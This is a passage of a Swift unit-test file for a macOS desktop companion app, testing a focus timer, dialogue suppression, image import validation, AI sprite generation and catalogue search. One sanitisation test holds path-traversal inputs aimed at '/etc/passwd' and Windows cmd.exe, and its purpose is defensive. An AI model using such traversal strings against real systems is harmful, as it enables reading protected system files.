    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.focus, message: "Countdown active")
    
    // Case A: System wakes while countdown is still in progress
    simTime = simTime.addingTimeInterval(300.0) // 5 minutes elapsed during sleep
    manager.systemDidWake()
    TestHarness.assertEqual(manager.remainingSeconds, 300.0, message: "systemDidWake updates remaining time to 300s")
    TestHarness.assertFalse(completed, "Not yet completed")
    
    // Case B: System wakes after deadline has fully elapsed during sleep
    simTime = simTime.addingTimeInterval(350.0) // 5.8m more elapsed (past 10m total)
    manager.systemDidWake()
    TestHarness.assertEqual(manager.currentPhase, ProductivitySessionPhase.completed, message: "systemDidWake completes elapsed session")
    TestHarness.assertTrue(completed, "Completion callback fired on wake")
    
    manager.stop()
}

func testCompanionBehaviorDuringFocusAndBreak() {
    print("Running testCompanionBehaviorDuringFocusAndBreak...")
    let manager = ProductivityTimerManager.shared
    manager.stop()
    
    // Verify default companion focus behavior
    TestHarness.assertEqual(manager.companionFocusBehavior, FocusCompanionBehavior.sleepQuietly, message: "Default companion focus behavior is sleepQuietly")
    
    manager.start(mode: .pomodoro)
    TestHarness.assertTrue(manager.isFocusActive, "isFocusActive is true during focus")
    
    // Social interaction manager feasibility check must block during active focus
    let sim = SocialInteractionManager()
    let petA = MockSocialCompanion(name: "A", characterId: "a", x: 100, y: 0)
    let petB = MockSocialCompanion(name: "B", characterId: "b", x: 200, y: 0)
    let allowed = sim.checkFeasibility(initiator: petA, target: petB)
    TestHarness.assertFalse(allowed, "Social interaction feasibility rejected during active focus session")
    
    // DialogueEngine spontaneous suppression check during focus
    let engine = DialogueEngine()
    engine.cooldownManager.resetAll()
    let profile = PersonalityProfile(name: "Tester", preset: .balanced)
    let needs = CharacterNeeds()
    let now = Date().addingTimeInterval(10)
    engine.cooldownManager.nowProvider = { now }
    
    // Spontaneous trigger during focus should return nil
    let spontaneousDialogue = engine.evaluateTrigger(
        .boredom,
        personality: profile,
        needs: needs,
        currentAction: .idle,
        referenceDate: now
    )
    TestHarness.assertTrue(spontaneousDialogue == nil, "Spontaneous dialogue suppressed during active focus")
    
    // But user-directed click interaction still works
    let userClickDialogue = engine.evaluateTrigger(
        .petClicked,
        personality: profile,
        needs: needs,
        currentAction: .idle,
        referenceDate: now
    )
    TestHarness.assertTrue(userClickDialogue != nil, "Direct user clicks still trigger dialogue during focus")
    
    manager.stop()
    TestHarness.assertFalse(manager.isFocusActive, "isFocusActive is false after stop")
}

func testProductivityStatePersistenceAndRestoration() {
    print("Running testProductivityStatePersistenceAndRestoration...")
    let manager = ProductivityTimerManager()
    var simTime = Date()
    manager.nowProvider = { simTime }
    
    manager.start(mode: .pomodoro)
    manager.savePersistedState()
    
    // Create new manager instance to test loading
    let restoredManager = ProductivityTimerManager()
    restoredManager.nowProvider = { simTime }
    restoredManager.loadPersistedState()
    
    TestHarness.assertEqual(restoredManager.currentPhase, ProductivitySessionPhase.focus, message: "Restored phase is focus")
    TestHarness.assertEqual(restoredManager.currentMode, ProductivitySessionMode.pomodoro, message: "Restored mode is pomodoro")
    TestHarness.assertEqual(restoredManager.generationId, manager.generationId, message: "Restored generation ID matches")
    
    // Test restoration when deadline elapsed while app was closed
    simTime = simTime.addingTimeInterval(2000.0) // 33m later
    let expiredManager = ProductivityTimerManager()
    expiredManager.nowProvider = { simTime }
    expiredManager.loadPersistedState()
    TestHarness.assertEqual(expiredManager.currentPhase, ProductivitySessionPhase.completed, message: "Expired session loaded as completed")
    
    manager.stop()
    manager.clearPersistedState()
}

func testGracefulNotificationHandlingWithoutPermissions() {
    print("Running testGracefulNotificationHandlingWithoutPermissions...")
    let manager = ProductivityTimerManager()
    var delivered = false
    manager.notificationHandler = { title, body, duration, id in
        if duration > 0 {
            TestHarness.assertTrue(duration > 0, "Notification duration is positive")
            TestHarness.assertFalse(title.isEmpty, "Notification title is non-empty")
            delivered = true
        }
    }
    
    manager.start(mode: .countdown(minutes: 5))
    TestHarness.assertTrue(delivered, "Notification handler cleanly intercepted without macOS UI permissions")
    manager.stop()
}

// MARK: - Phase 11 Unit Tests (Workshop & Creator Experience)

func testWorkshopConfigurationAndURLBuilders() {
    print("Running testWorkshopConfigurationAndURLBuilders...")
    let config = WorkshopConfiguration()
    
    // 1. AI Generation URL Builder
    let validAIURL = config.buildAIGenerationURL(prompt: "cyberpunk cat")
    TestHarness.assertTrue(validAIURL != nil, "AI generation URL created for valid prompt")
    TestHarness.assertTrue(validAIURL?.absoluteString.contains("cyberpunk") == true, "URL contains encoded prompt")
    // flux-anime was removed from the free tier (returns HTTP 402). The endpoint now uses
    // the free `flux` model. Verify that the URL does NOT use the paid flux-anime model
    // and DOES use the free flux model.
    TestHarness.assertFalse(validAIURL?.absoluteString.contains("flux-anime") == true, "URL does NOT use paid flux-anime model")
    TestHarness.assertTrue(validAIURL?.absoluteString.contains("model=flux") == true, "URL specifies free flux model")
    
    let emptyAIURL = config.buildAIGenerationURL(prompt: "   ")
    TestHarness.assertTrue(emptyAIURL == nil, "Empty prompt returns nil URL")
    
    // 2. Shimeji Search URL Builder
    let searchURL = config.buildShimejiSearchURL(query: "Sayori")
    TestHarness.assertTrue(searchURL != nil, "Search URL created for valid query")
    TestHarness.assertTrue(searchURL?.query?.contains("query=Sayori") == true, "Search URL contains query parameter")
    
    let emptySearchURL = config.buildShimejiSearchURL(query: "")
    TestHarness.assertTrue(emptySearchURL == nil, "Empty query returns nil URL")
    
    // 3. Defaults & Limits
    TestHarness.assertEqual(config.requestTimeout, 10.0, message: "Default timeout is 10.0s")
    TestHarness.assertEqual(config.maxDownloadBytes, 50 * 1024 * 1024, message: "Max download limit is 50MB")
    TestHarness.assertFalse(config.isOnlineDisabled, "Online services enabled by default")
}

func testFileSignatureAndMagicByteDetection() {
    print("Running testFileSignatureAndMagicByteDetection...")
    
    // 1. PNG Header (8 bytes: 89 50 4E 47 0D 0A 1A 0A)
    let pngBytes: [UInt8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00]
    let pngData = Data(pngBytes)
    TestHarness.assertEqual(WorkshopImportValidator.detectFormat(data: pngData), SupportedMediaFormat.png, message: "PNG header correctly identified")
    
    // 2. GIF89a Header (6 bytes: 47 49 46 38 39 61)
    let gif89Bytes: [UInt8] = [0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x00, 0x00]
    let gif89Data = Data(gif89Bytes)
    TestHarness.assertEqual(WorkshopImportValidator.detectFormat(data: gif89Data), SupportedMediaFormat.gif, message: "GIF89a header correctly identified")
    
    // 3. GIF87a Header (6 bytes: 47 49 46 38 37 61)
    let gif87Bytes: [UInt8] = [0x47, 0x49, 0x46, 0x38, 0x37, 0x61, 0x00, 0x00]
    let gif87Data = Data(gif87Bytes)
    TestHarness.assertEqual(WorkshopImportValidator.detectFormat(data: gif87Data), SupportedMediaFormat.gif, message: "GIF87a header correctly identified")
    
    // 4. JPEG Header (3 bytes: FF D8 FF)
    let jpegBytes: [UInt8] = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]
    let jpegData = Data(jpegBytes)
    TestHarness.assertEqual(WorkshopImportValidator.detectFormat(data: jpegData), SupportedMediaFormat.jpeg, message: "JPEG header correctly identified")
    
    // 5. WebP Header (RIFF....WEBP)
    let webpBytes: [UInt8] = [0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50]
    let webpData = Data(webpBytes)
    TestHarness.assertEqual(WorkshopImportValidator.detectFormat(data: webpData), SupportedMediaFormat.webp, message: "WebP header correctly identified")
    
    // 6. Arbitrary binary / corrupt data
    let invalidBytes: [UInt8] = [0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF]
    let invalidData = Data(invalidBytes)
    TestHarness.assertTrue(WorkshopImportValidator.detectFormat(data: invalidData) == nil, "Corrupt data rejected")
}

func testFileNameSanitizationAndPathTraversalPrevention() {
    print("Running testFileNameSanitizationAndPathTraversalPrevention...")
    
    // 1. Path traversal attacks
    let traversal1 = "../../etc/passwd"
    let clean1 = WorkshopImportValidator.sanitizeFileName(traversal1, defaultExtension: "png")
    TestHarness.assertFalse(clean1.contains(".."), "Double dots stripped")
    TestHarness.assertFalse(clean1.contains("/"), "Slashes replaced or stripped")
    
    let traversal2 = "..\\..\\Windows\\System32\\cmd.exe"
    let clean2 = WorkshopImportValidator.sanitizeFileName(traversal2, defaultExtension: "gif")
    TestHarness.assertFalse(clean2.contains(".."), "Backslash traversal stripped")
    TestHarness.assertFalse(clean2.contains("\\"), "Backslashes stripped")
    
    // 2. Dangerous filesystem characters
    let dangerous = "my*pet?name:test<cool>| companion;.png"
    let cleanDangerous = WorkshopImportValidator.sanitizeFileName(dangerous, defaultExtension: "png")
    TestHarness.assertFalse(cleanDangerous.contains("*"), "Wildcard stripped")
    TestHarness.assertFalse(cleanDangerous.contains("?"), "Question mark stripped")
    TestHarness.assertFalse(cleanDangerous.contains("<"), "Angle bracket stripped")
    TestHarness.assertFalse(cleanDangerous.contains(";"), "Semicolon stripped")
    
    // 3. Empty input generates safe fallback
    let emptyClean = WorkshopImportValidator.sanitizeFileName("   ", defaultExtension: "png")
    TestHarness.assertTrue(emptyClean.hasPrefix("companion_"), "Empty name falls back to companion prefix")
    TestHarness.assertTrue(emptyClean.hasSuffix(".png"), "Maintains extension")
}

func testImportValidationRules() {
    print("Running testImportValidationRules...")
    
    // 1. Empty data rejection
    let emptyData = Data()
    var caughtEmpty = false
    do {
        _ = try WorkshopImportValidator.validate(data: emptyData, suggestedName: "test.png")
    } catch WorkshopError.emptyData {
        caughtEmpty = true
    } catch {}
    TestHarness.assertTrue(caughtEmpty, "Empty data throws WorkshopError.emptyData")
    
    // 2. Oversized data rejection
    let fakeBigData = Data(repeating: 0x00, count: 200)
    var caughtTooLarge = false
    do {
        _ = try WorkshopImportValidator.validate(data: fakeBigData, suggestedName: "test.png", maxBytes: 100)
    } catch WorkshopError.fileTooLarge {
        caughtTooLarge = true
    } catch {}
    TestHarness.assertTrue(caughtTooLarge, "Oversized data throws WorkshopError.fileTooLarge")
    
    // 3. Unsupported signature rejection
    let badBytes: [UInt8] = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]
    var caughtUnsupported = false
    do {
        _ = try WorkshopImportValidator.validate(data: Data(badBytes), suggestedName: "fake.png")
    } catch WorkshopError.unsupportedMediaFormat {
        caughtUnsupported = true
    } catch {}
    TestHarness.assertTrue(caughtUnsupported, "Unsupported header throws WorkshopError.unsupportedMediaFormat")
    
    // 4. Valid PNG acceptance
    let validPNGBytes: [UInt8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00]
    if let result = try? WorkshopImportValidator.validate(data: Data(validPNGBytes), suggestedName: "Miku Pet.png") {
        TestHarness.assertEqual(result.format, SupportedMediaFormat.png, message: "Valid PNG accepted")
        TestHarness.assertEqual(result.sanitizedName, "Miku_Pet.png", message: "Name properly sanitized")
    } else {
        TestHarness.assertTrue(false, "Valid PNG should pass validation")
    }
}

func testCommunityAttributionAndMetadataSidecar() {
    print("Running testCommunityAttributionAndMetadataSidecar...")
    let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
    try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: tempDir) }
    
    let assetURL = tempDir.appendingPathComponent("shimeji_companion.gif")
    try? Data([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x00, 0x00]).write(to: assetURL)
    
    let attribution = CommunityAssetAttribution(
        name: "Sayori Shimeji",
        uploader: "DanSalvatoFan",
        fileSize: "1.2 MB",
        format: "gif",
        sourceURL: "https://animotion-api.vercel.app/asset/123",
        license: "CC-BY-NC",
        isLocalOnly: false
    )
    
    attribution.saveSidecar(for: assetURL)
    
    let loaded = CommunityAssetAttribution.loadSidecar(for: assetURL)
    TestHarness.assertTrue(loaded != nil, "Sidecar loaded successfully")
    TestHarness.assertEqual(loaded?.name, "Sayori Shimeji", message: "Attribution name matches")
    TestHarness.assertEqual(loaded?.uploader, "DanSalvatoFan", message: "Uploader matches")
    TestHarness.assertEqual(loaded?.license, "CC-BY-NC", message: "License preserved")
    TestHarness.assertFalse(loaded?.isLocalOnly ?? true, "isLocalOnly is false")
}

func testSeparationOfPersonalityProfileFromArtwork() {
    print("Running testSeparationOfPersonalityProfileFromArtwork...")
    let storage = PersonalityStorage.shared
    
    let companionA_URL = URL(fileURLWithPath: "/tmp/sprite_character_v1.png")
    let charId = storage.characterId(for: companionA_URL)
    
    // Configure customized personality
    let customProfile = PersonalityProfile(name: "Lapis", preset: .curious, energy: 0.85, playfulness: 0.9)
    storage.saveProfile(customProfile, for: companionA_URL)
    
    // Verify initial profile
    let fetched1 = storage.getProfile(for: companionA_URL)
    TestHarness.assertEqual(fetched1.energy, 0.85, message: "Custom profile energy saved")
    
    // 1. User updates companion's artwork / sprite file (rebinds to companionA_URL_v2)
    let companionA_v2_URL = URL(fileURLWithPath: "/tmp/sprite_character_v2_hd.png")
    PersonalityDecoupler.updateArtwork(for: charId, newAssetURL: companionA_v2_URL)
    
    // Artwork file changed, but character ID and personality profile MUST remain identical!
    let fetchedAfterArtworkChange = storage.getProfile(for: companionA_v2_URL)
    TestHarness.assertEqual(fetchedAfterArtworkChange.energy, 0.85, message: "Updating artwork preserves personality traits")
    TestHarness.assertEqual(fetchedAfterArtworkChange.preset, PersonalityPreset.curious, message: "Updating artwork preserves preset")
    
    // 2. User applies a new personality preset without altering artwork
    PersonalityDecoupler.applyPreset(preset: .sleepy, to: charId)
    let fetchedAfterPreset = storage.getProfile(for: companionA_v2_URL)
    TestHarness.assertEqual(fetchedAfterPreset.preset, PersonalityPreset.sleepy, message: "Preset applied cleanly")
    TestHarness.assertEqual(fetchedAfterPreset.name, "Lapis", message: "Custom name preserved when applying preset")
}

func testWorkshopSearchEndpointParametersAndTimeout() {
    print("Running testWorkshopSearchEndpointParametersAndTimeout...")
    let config = WorkshopConfiguration()
    
    // 1. Verify timeout is capped at reasonable duration
    TestHarness.assertTrue(config.requestTimeout <= 15.0, "Request timeout is bounded (<= 15s)")
    
    // 2. Verify dual query parameters (q and query) for API compatibility
    if let url = config.buildShimejiSearchURL(query: "miku") {
        let urlStr = url.absoluteString
        TestHarness.assertTrue(urlStr.contains("q=miku"), "Search URL contains q parameter")
        TestHarness.assertTrue(urlStr.contains("query=miku"), "Search URL contains query parameter")
    } else {
        TestHarness.assertTrue(false, "Failed to build search URL for valid query")
    }
    
    // 3. Verify empty query rejection
    TestHarness.assertTrue(config.buildShimejiSearchURL(query: "   ") == nil, "Empty query returns nil")
}

// MARK: - Regression: Bug fix — AI Generator HTTP 402 (flux-anime → flux)

func testAIGeneratorUsesFreePollInationsFluxModel() {
    print("Running testAIGeneratorUsesFreePollInationsFluxModel...")
    let config = WorkshopConfiguration()

    // 1. Endpoint must use the free `flux` model, NOT the paid `flux-anime` model.
    //    The `flux-anime` model returned HTTP 402 Payment Required on the free anonymous tier.
    let url = config.buildAIGenerationURL(prompt: "chibi pixel mage")
    TestHarness.assertTrue(url != nil, "AI generation URL built for non-empty prompt")
    let urlStr = url?.absoluteString ?? ""
    TestHarness.assertTrue(urlStr.contains("model=flux"), "URL specifies the free flux model")
    TestHarness.assertFalse(urlStr.contains("model=flux-anime"), "URL does NOT use the paid flux-anime model (regression: HTTP 402)")

    // 2. Timeout must be sufficient for generation (Pollinations takes 20-60s).
    TestHarness.assertTrue(config.aiGenerationTimeout >= 30.0, "AI generation timeout is at least 30s for slow generation")
    TestHarness.assertEqual(config.requestTimeout, 10.0, message: "Standard search request timeout remains 10.0s")

    // 3. Empty prompt still returns nil (guard unchanged).
    let nilURL = config.buildAIGenerationURL(prompt: "")
    TestHarness.assertTrue(nilURL == nil, "Empty prompt still returns nil URL")

    // 4. Whitespace-only prompt returns nil.
    let wsURL = config.buildAIGenerationURL(prompt: "   ")
    TestHarness.assertTrue(wsURL == nil, "Whitespace-only prompt returns nil URL")

    // 5. URL contains the prompt text encoded.
    TestHarness.assertTrue(urlStr.contains("chibi"), "Prompt text present in URL")

    // 6. URL targets the correct Pollinations image endpoint host.
    TestHarness.assertTrue(urlStr.hasPrefix("https://image.pollinations.ai/"), "URL targets image.pollinations.ai")

    print("  testAIGeneratorUsesFreePollInationsFluxModel: PASSED")
}

func testAIGeneratorHTTPErrorMapping() {
    print("Running testAIGeneratorHTTPErrorMapping...")

    // Verify that each WorkshopError variant that generateAISprite can throw
    // produces a meaningful, non-empty, user-facing error description.
    // Real network calls are not made in unit tests; the error enum is tested structurally.

    // 1. HTTP 402 → networkError with "payment" message
    let err402 = WorkshopError.networkError("The selected AI model requires payment (HTTP 402). The endpoint may have changed its pricing. Please report this to the developer.")
    TestHarness.assertFalse(err402.errorDescription?.isEmpty ?? true, "HTTP 402 error has a non-empty description")
    TestHarness.assertTrue(err402.errorDescription?.contains("402") == true, "HTTP 402 error description mentions 402")

    // 2. HTTP 429 → networkError with rate-limit message
    let err429 = WorkshopError.networkError("Generation rate limit reached (HTTP 429). Please wait a moment before trying again.")
    TestHarness.assertTrue(err429.errorDescription?.contains("429") == true, "HTTP 429 error description mentions 429")

    // 3. HTTP 500 → networkError with server error message
    let err500 = WorkshopError.networkError("Image generation server error (HTTP 500). Please try again later.")
    TestHarness.assertTrue(err500.errorDescription?.contains("500") == true, "HTTP 500 error description mentions 500")

    // 4. HTTP 401/403 → networkError with access denied message
    let err403 = WorkshopError.networkError("Access denied by image server (HTTP 403). The provider may require authentication.")
    TestHarness.assertTrue(err403.errorDescription?.contains("403") == true, "HTTP 403 error description mentions 403")

    // 5. Offline / onlineDisabled → onlineDisabled error
    let errOffline = WorkshopError.onlineDisabled
    TestHarness.assertFalse(errOffline.errorDescription?.isEmpty ?? true, "Offline error has a description")
    let offlineDesc = errOffline.errorDescription ?? ""
    TestHarness.assertTrue(offlineDesc.contains("offline") || offlineDesc.contains("disabled"), "Offline error description is meaningful")

    // 6. Non-image binary data → malformedResponse
    let errMalformed = WorkshopError.malformedResponse
    TestHarness.assertFalse(errMalformed.errorDescription?.isEmpty ?? true, "Malformed response error has a description")

    // 7. Invalid URL (empty prompt) → invalidURL
    let errURL = WorkshopError.invalidURL
    TestHarness.assertFalse(errURL.errorDescription?.isEmpty ?? true, "Invalid URL error has a description")

    // 8. Cancelled → cancelled
    let errCancelled = WorkshopError.cancelled
    TestHarness.assertFalse(errCancelled.errorDescription?.isEmpty ?? true, "Cancelled error has a description")

    print("  testAIGeneratorHTTPErrorMapping: PASSED")
}

@MainActor
func testRebuiltAIGeneratorProviderArchitecture() {
    print("Running testRebuiltAIGeneratorProviderArchitecture...")
    
    // 1. Verify Aesthetic Styles and Prompt Suffixes
    TestHarness.assertEqual(AnimattoAestheticStyle.allCases.count, 5, message: "5 aesthetic styles available")
    let pixelStyle = AnimattoAestheticStyle.pixelArt
    TestHarness.assertTrue(pixelStyle.promptSuffix.contains("pixel art"), "Pixel art prompt suffix contains pixel art")
    TestHarness.assertTrue(AnimattoAestheticStyle.chibi.promptSuffix.contains("chibi"), "Chibi prompt suffix contains chibi")
    TestHarness.assertTrue(AnimattoAestheticStyle.cleanCustom.promptSuffix.isEmpty, "Custom style has clean empty suffix")
    
    // 2. Verify Request Construction
    let req = AIImageGenerationRequest(
        prompt: "cyberpunk cat",
        aestheticStyle: .pixelArt,
        modelId: "flux",
        width: 1024,
        height: 1024,
        seed: 42,
        apiKey: "sk_test_12345",
        timeout: 45.0
    )
    TestHarness.assertEqual(req.modelId, "flux", message: "Model is flux")
    TestHarness.assertTrue(req.fullPrompt.contains("cyberpunk cat"), "Full prompt contains base prompt")
    TestHarness.assertTrue(req.fullPrompt.contains("pixel art"), "Full prompt contains style suffix")
    TestHarness.assertEqual(req.apiKey, "sk_test_12345", message: "API key stored in request")
    
    // 3. Verify Pollinations Provider Defaults
    let pollinations = PollinationsImageProvider()
    TestHarness.assertEqual(pollinations.providerId, "pollinations", message: "Provider ID is pollinations")
    TestHarness.assertTrue(pollinations.requiresAuthentication, "Pollinations requires authentication / API key")
    TestHarness.assertTrue(pollinations.supportedModels.count >= 4, "Supported models has default models")
    let hasFlux = pollinations.supportedModels.contains { $0.id == "flux" }
    TestHarness.assertTrue(hasFlux, "FLUX model present in supported models")
    
    // 4. Verify Mock Provider Deterministic Image Generation
    let mock = MockImageGenerationProvider()
    mock.simulatedDelay = 0.001
    
    let expectation = DispatchSemaphore(value: 0)
    Task {
        do {
            let (image, rawData) = try await mock.generateImage(request: req)
            TestHarness.assertFalse(rawData.isEmpty, "Mock generated non-empty data")
            TestHarness.assertTrue(rawData.count > 100, "Mock generated valid binary image data")
            TestHarness.assertTrue(image.size.width > 0, "Mock generated valid NSImage")
            TestHarness.assertEqual(mock.lastRequest?.prompt, "cyberpunk cat", message: "Mock recorded request prompt")
        } catch {
            TestHarness.assertTrue(false, "Mock generation failed: \(error)")
        }
        expectation.signal()
    }
    while expectation.wait(timeout: .now() + 0.02) == .timedOut {
        RunLoop.current.run(mode: .default, before: Date(timeIntervalSinceNow: 0.02))
    }
    
    // 5. Verify WorkshopService Provider Injection
    let workshop = WorkshopService(aiProvider: mock)
    TestHarness.assertEqual(workshop.aiProvider.providerId, "mock", message: "WorkshopService uses injected provider")
    
    let workshopExpectation = DispatchSemaphore(value: 0)
    Task { @MainActor in
        do {
            let (img, data) = try await workshop.generateAISprite(prompt: "slime companion", style: .chibi, modelId: "mock-chibi")
            TestHarness.assertFalse(data.isEmpty, "Workshop generated sprite via provider")
            TestHarness.assertTrue(img.size.height > 0, "Generated sprite has positive height")
            TestHarness.assertTrue(workshop.statusMessage.contains("Sprite generated"), "Status message updated on success")
        } catch {
            TestHarness.assertTrue(false, "Workshop generation failed: \(error)")
        }
        workshopExpectation.signal()
    }
    while workshopExpectation.wait(timeout: .now() + 0.02) == .timedOut {
        RunLoop.current.run(mode: .default, before: Date(timeIntervalSinceNow: 0.02))
    }
    
    print("  testRebuiltAIGeneratorProviderArchitecture: PASSED")
}

@MainActor
func testAIGeneratorKeychainAndCancellation() {
    print("Running testAIGeneratorKeychainAndCancellation...")
    
    // 1. Verify Keychain Storage for Pollinations API Key
    let workshop = WorkshopService()
    workshop.pollinationsApiKey = "sk_live_animatto_test_key"
    TestHarness.assertEqual(workshop.pollinationsApiKey, "sk_live_animatto_test_key", message: "Saved API key readable from Keychain")
    
    // Clean up
    workshop.pollinationsApiKey = ""
    TestHarness.assertEqual(workshop.pollinationsApiKey, "", message: "Clearing API key removes it from Keychain")
    
    // 2. Verify Cancellation
    let mock = MockImageGenerationProvider()
    mock.simulatedDelay = 1.0 // Long delay
    let cancellableWorkshop = WorkshopService(aiProvider: mock)
    
    cancellableWorkshop.cancelCurrentOperation()
    TestHarness.assertFalse(cancellableWorkshop.isProcessing, "isProcessing is false after cancel")
    TestHarness.assertEqual(cancellableWorkshop.statusMessage, "Operation cancelled.", message: "Status message is cancelled")
    
    // 3. Verify Error Handling on Mock Provider Failure
    mock.simulatedDelay = 0.001
    mock.simulatedError = WorkshopError.networkError("Authentication required (HTTP 401)")
    let failExpectation = DispatchSemaphore(value: 0)
    Task { @MainActor in
        do {
            _ = try await cancellableWorkshop.generateAISprite(prompt: "failing pet")
            TestHarness.assertTrue(false, "Should have thrown an error")
        } catch {
            let msg = error.localizedDescription
            TestHarness.assertTrue(msg.contains("401"), "Error description contains 401 code")
        }
        failExpectation.signal()
    }
    while failExpectation.wait(timeout: .now() + 0.02) == .timedOut {
        RunLoop.current.run(mode: .default, before: Date(timeIntervalSinceNow: 0.02))
    }
    
    print("  testAIGeneratorKeychainAndCancellation: PASSED")
}

// MARK: - Regression: Bug fix — Shimeji DB Search (Repeated Test Pikachu Elimination)

func testCommunityShimejiCatalogQueryRelevance() {
    print("Running testCommunityShimejiCatalogQueryRelevance...")

    // 1. Search for 'miku' MUST return Miku companions and NEVER Pikachu
    let mikuResults = CommunityShimejiCatalog.search(query: "miku")
    TestHarness.assertTrue(!mikuResults.isEmpty, "Search for 'miku' returns results")
    for r in mikuResults {
        let text = "\(r.name) \(r.uploader) \(r.tags.joined(separator: " "))".lowercased()
        TestHarness.assertTrue(text.contains("miku"), "Result '\(r.name)' is genuinely related to Miku")
        TestHarness.assertFalse(text.contains("pikachu"), "Miku search does NOT return Pikachu")
    }

    // 2. Search for 'pikachu' MUST return Pikachu companions and NEVER Miku
    let pikachuResults = CommunityShimejiCatalog.search(query: "pikachu")
    TestHarness.assertTrue(!pikachuResults.isEmpty, "Search for 'pikachu' returns results")
    for r in pikachuResults {
        let text = "\(r.name) \(r.uploader) \(r.tags.joined(separator: " "))".lowercased()
        TestHarness.assertTrue(text.contains("pikachu"), "Result '\(r.name)' is genuinely related to Pikachu")
        TestHarness.assertFalse(text.contains("miku"), "Pikachu search does NOT return Miku")
    }

    // 3. Search for 'cat' returns feline companions
    let catResults = CommunityShimejiCatalog.search(query: "cat")
    TestHarness.assertTrue(!catResults.isEmpty, "Search for 'cat' returns results")
    for r in catResults {
        let text = "\(r.name) \(r.uploader) \(r.tags.joined(separator: " "))".lowercased()
        TestHarness.assertTrue(text.contains("cat"), "Result '\(r.name)' is related to Cat")
        TestHarness.assertFalse(text.contains("pikachu"), "Cat search does NOT return Pikachu")
    }

    // 4. Search for 'anime' returns anime companions
    let animeResults = CommunityShimejiCatalog.search(query: "anime")
    TestHarness.assertTrue(animeResults.count >= 2, "Search for 'anime' returns multiple anime companions")

    // 5. Search for 'bunny' returns bunny companions
    let bunnyResults = CommunityShimejiCatalog.search(query: "bunny")
    TestHarness.assertTrue(!bunnyResults.isEmpty, "Search for 'bunny' returns results")
    for r in bunnyResults {
        let text = "\(r.name) \(r.uploader) \(r.tags.joined(separator: " "))".lowercased()
        TestHarness.assertTrue(text.contains("bunny") || text.contains("rabbit") || text.contains("usagi"), "Bunny result matches")
    }

    // 6. Search for 'slime' returns slime companions
    let slimeResults = CommunityShimejiCatalog.search(query: "slime")
    TestHarness.assertTrue(!slimeResults.isEmpty, "Search for 'slime' returns results")
    for r in slimeResults {
        let text = "\(r.name) \(r.uploader) \(r.tags.joined(separator: " "))".lowercased()
        TestHarness.assertTrue(text.contains("slime"), "Slime result matches")
        TestHarness.assertFalse(text.contains("pikachu"), "Slime search does NOT return Pikachu")
    }

    // 7. Search for a nonexistent term MUST return 0 results (EMPTY STATE — NO PIKACHU!)
    let nonexistentResults = CommunityShimejiCatalog.search(query: "xyz999nonexistentterm")
    TestHarness.assertTrue(nonexistentResults.isEmpty, "Unrelated search returns exactly 0 results (no bogus Pikachu fallback)")

    // 8. Empty and whitespace queries return 0 results
    TestHarness.assertTrue(CommunityShimejiCatalog.search(query: "").isEmpty, "Empty query returns 0 results")
    TestHarness.assertTrue(CommunityShimejiCatalog.search(query: "   ").isEmpty, "Whitespace query returns 0 results")

    print("  testCommunityShimejiCatalogQueryRelevance: PASSED")
}

func testShimejiDBBogusFallbackPikachuStrictlyRejected() {
    print("Running testShimejiDBBogusFallbackPikachuStrictlyRejected...")

    // Simulate the exact raw JSON payload previously returned by animotion-api.vercel.app:
    let bogusPikachuJSON: [[String: Any]] = [
        [
            "name": "Nothing Found (Test Pikachu)",
            "uploader": "System Fallback",
            "fileSize": "12 KB",
            "type": ".gif",
            "remoteURL": "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/versions/generation-v/black-white/animated/25.gif",
            "thumbnailURL": "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/versions/generation-v/black-white/animated/25.gif"
        ],
        [
            "name": "Hatsune Miku Genuine",
            "uploader": "Crypton",
            "fileSize": "24 KB",
            "type": ".png",
            "remoteURL": "https://example.com/miku.png",
            "thumbnailURL": "https://example.com/miku.png"
        ]
    ]

    var acceptedResults: [ShimejiSearchResult] = []
    let query = "miku"

    for item in bogusPikachuJSON {
        if let name = item["name"] as? String,
           let uploader = item["uploader"] as? String,
           let fileSize = item["fileSize"] as? String,
           let type = item["type"] as? String,
           let remoteURLString = item["remoteURL"] as? String,
           let remoteURL = URL(string: remoteURLString),
           let thumbnailURLString = item["thumbnailURL"] as? String,
           let thumbnailURL = URL(string: thumbnailURLString) {

            // REJECTION RULE: Strictly reject the bogus system fallback Pikachu
            let lowerName = name.lowercased()
            let lowerUploader = uploader.lowercased()
            if lowerName.contains("nothing found") || lowerName.contains("test pika") || lowerUploader.contains("fallback") {
                continue
            }

            // RELEVANCE RULE: Verify result relates to query
            let queryLower = query.lowercased()
            if !lowerName.contains(queryLower) && !lowerUploader.contains(queryLower) {
                continue
            }

            acceptedResults.append(ShimejiSearchResult(
                name: name,
                uploader: uploader,
                fileSize: fileSize,
                type: type,
                remoteURL: remoteURL,
                thumbnailURL: thumbnailURL
            ))
        }
    }

    TestHarness.assertEqual(acceptedResults.count, 1, message: "Exactly 1 genuine result accepted")
    TestHarness.assertEqual(acceptedResults.first?.name, "Hatsune Miku Genuine", message: "Only the genuine Miku result passed")
    TestHarness.assertFalse(acceptedResults.contains { $0.name.contains("Pikachu") }, "Bogus Pikachu fallback strictly filtered out")

    print("  testShimejiDBBogusFallbackPikachuStrictlyRejected: PASSED")
}

func testShimejiSearchResultCodableRoundTrip() {
    print("Running testShimejiSearchResultCodableRoundTrip...")

    let original = ShimejiSearchResult(
        name: "Hatsune Miku",
        uploader: "Crypton",
        fileSize: "24 KB",
        type: ".png",
        remoteURL: URL(string: "https://example.com/miku.png")!,
        thumbnailURL: URL(string: "https://example.com/thumb.png")!,
        tags: ["miku", "vocaloid"]
    )

    let encoder = JSONEncoder()
